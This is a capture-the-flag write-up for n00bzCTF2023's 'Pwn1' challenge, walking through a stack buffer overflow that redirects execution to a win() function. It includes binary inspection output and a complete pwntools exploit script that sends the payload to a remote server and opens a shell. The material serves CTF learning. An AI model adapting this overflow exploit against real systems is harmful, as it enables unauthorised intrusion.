# Pwn1 Binary Exploitation Challenge Writeup

### Winner of n00bzCTF2023 Best Technical Writeup award

## Introduction

The "Pwn1" challenge is a binary exploitation challenge that requires exploiting a vulnerable binary to gain a remote shell. In this writeup, we'll walk through the process of solving the challenge step by step. The challenge binary, named `pwn1` was hosted on the server `challs.n00bzunit3d.xyz` on port `35932`. We'll use a Python script with the help of the `pwntools` library to automate the exploitation process.

## Step 1: Understanding the Challenge

After downloading the `pwn1` binary, the first step is to understand its properties. We can use the `file` command to check the file type and get information about the binary. When we run the command `file pwn1`, the output shows: 
```
pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=717cbfc0edae70e649c90cc5c40173e1a092d141, for GNU/Linux 3.2.0, not stripped
```

This output tells us that the `pwn1` binary is an ELF 64-bit LSB executable, specifically for the x86-64 architecture. It is dynamically linked and uses the `/lib64/ld-linux-x86-64.so.2` interpreter. The BuildID is a unique identifier for the binary. The binary was built for GNU/Linux 3.2.0 and is not stripped, which means the symbols and debugging information are still present.

## Step 2: Checking Symbols

To gain further insights into the binary, we can check the symbols using the `readelf` command. By running `readelf --symbols pwn1`, we can examine the symbol table of the binary and look for any relevant functions or symbols. In this case, we find the `win` function.

```
Symbol table '.dynsym' contains 10 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (3)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.2.5 (3)
     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
     7: 0000000000404060     8 OBJECT  GLOBAL DEFAULT   26 [...]@GLIBC_2.2.5 (3)
     8: 0000000000404070     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (3)
     9: 0000000000404080     8 OBJECT  GLOBAL DEFAULT   26 [...]@GLIBC_2.2.5 (3)

Symbol table '.symtab' contains 42 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crt1.o
     2: 000000000040038c    32 OBJECT  LOCAL  DEFAULT    4 __abi_tag
     3: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
     4: 00000000004010f0     0 FUNC    LOCAL  DEFAULT   15 deregister_tm_clones
     5: 0000000000401120     0 FUNC    LOCAL  DEFAULT   15 register_tm_clones
     6: 0000000000401160     0 FUNC    LOCAL  DEFAULT   15 __do_global_dtors_aux
     7: 0000000000404088     1 OBJECT  LOCAL  DEFAULT   26 completed.0
     8: 0000000000403e18     0 OBJECT  LOCAL  DEFAULT   21 __do_global_dtor[...]
     9: 0000000000401190     0 FUNC    LOCAL  DEFAULT   15 frame_dummy
    10: 0000000000403e10     0 OBJECT  LOCAL  DEFAULT   20 __frame_dummy_in[...]
    11: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS chall.c
    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    13: 0000000000402160     0 OBJECT  LOCAL  DEFAULT   19 __FRAME_END__
    14: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
    15: 0000000000403e20     0 OBJECT  LOCAL  DEFAULT   22 _DYNAMIC
    16: 0000000000402038     0 NOTYPE  LOCAL  DEFAULT   18 __GNU_EH_FRAME_HDR
    17: 0000000000404000     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_
    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    19: 0000000000404060     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5
    20: 0000000000404038     0 NOTYPE  WEAK   DEFAULT   25 data_start
    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5
    22: 0000000000404070     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5
    23: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   25 _edata
    24: 0000000000401268     0 FUNC    GLOBAL HIDDEN    16 _fini
    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.2.5
    26: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.2.5
    27: 0000000000404038     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
    28: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    29: 0000000000404040     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
    30: 0000000000402000     4 OBJECT  GLOBAL DEFAULT   17 _IO_stdin_used
    31: 0000000000401196   101 FUNC    GLOBAL DEFAULT   15 init
    32: 000000000040124a    27 FUNC    GLOBAL DEFAULT   15 win         <<<------ Here We found the Win function
    33: 0000000000404090     0 NOTYPE  GLOBAL DEFAULT   26 _end
    34: 00000000004010e0     5 FUNC    GLOBAL HIDDEN    15 _dl_relocate_sta[...]
    35: 00000000004010b0    38 FUNC    GLOBAL DEFAULT   15 _start
    36: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
    37: 00000000004011fb    79 FUNC    GLOBAL DEFAULT   15 main
    38: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@GLIBC_2.2.5
    39: 0000000000404048     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
    40: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init
    41: 0000000000404080     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5
```

## Step 3: Making the Binary Executable

Before we can run the `pwn1` binary, we need to make it executable. We can do this by running the command `chmod +x pwn1`. This grants execute permissions to the binary, allowing us to run it.

## Step 4: Finding the Offset

To determine the offset required to overwrite the return address, we can use pattern generation and debugging with GDB. In the terminal, we execute `gdb ./pwn1` to start debugging the binary. Within the GDB environment, we use the command `pattern create 100` to generate a pattern of length 100.

We then run the binary with the generated pattern as input. The binary crashes, indicating that the pattern has been successfully written to memory. We examine the value of the program counter (RIP) by running the command `info registers` in GDB. The offset can be determined by identifying the position of the pattern in memory.
The Final Exploit:

```py
#!usr/bin/env/python3

from pwn import *
import sys
import warnings

warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = "DEBUG"

server = sys.argv[1]
port = sys.argv[2]
elf = ELF("./pwn1")
garbage = b"A"*72

rip = p64(elf.symbols['win'])

payload = garbage + rip	



p = remote(server,port)

p.recvline()
p.sendline(payload)
p.interactive()
```

## Step 5: Setting Up the Exploit Script

To automate the exploitation process, we'll use the `pwntools` library. We start by importing the necessary modules and setting up the exploit environment in our Python script. The script defines the target server and port, as well as the path to the "pwn1" binary on the local machine.

## Step 6: Analyzing the Binary

Before exploiting the binary, it's important to understand its structure and identify any vulnerabilities. We can use the `pwn` module's `ELF` class to extract information about the binary. By loading the "pwn1" binary into an `ELF` object, we gain access to various attributes, such as symbols and addresses.

## Step 7: Preparing the Payload

The next step is to construct the payload that will trigger the vulnerability in the binary. In this case, the vulnerability is a buffer overflow. The payload consists of two parts: garbage data and the target address to overwrite the return address. We calculate the address of the "win" function using `elf.symbols['win']` and pack it into a little-endian representation using `p64()`.

## Step 8: Connecting to the Remote Server

With our payload ready, we establish a connection to the remote server using the `remote(server, port)` function from `pwntools`. This allows us to communicate with the binary running on the server. We assume that the binary is already running and waiting for input.

## Step 9: Exploiting the Binary

Once the connection is established, we interact with the binary. We receive the initial prompt from the binary using `p.recvline()` to clear the initial output. Then, we send our payload to the binary using `p.sendline(payload)`. This triggers the buffer overflow and overwrites the return address with the address of the "win" function.

## Step 10: Gaining Remote Shell Access

After sending the payload, we call `p.interactive()` to gain interactive access to the remote shell. This allows us to interact with the shell as if we were directly connected to it. At this point, we have successfully exploited the binary and gained a remote shell.

## Conclusion

In this writeup, we walked through the process of solving the "Pwn1" binary exploitation challenge. We checked the file type of the `pwn1` binary using the `file` command and explained the output. We then used the `readelf` command to examine the symbols in the binary, looking for the presence of the `win` function. We made the binary executable with `chmod +x` and continued with the Python script for exploitation. By analyzing the binary, identifying the vulnerability, determining the offset using pattern generation and GDB, and constructing a payload, we successfully exploited the binary and gained a remote shell. Binary exploitation challenges like this one require a solid understanding of memory management, assembly, and vulnerability analysis, making them an exciting and challenging field in cybersecurity.



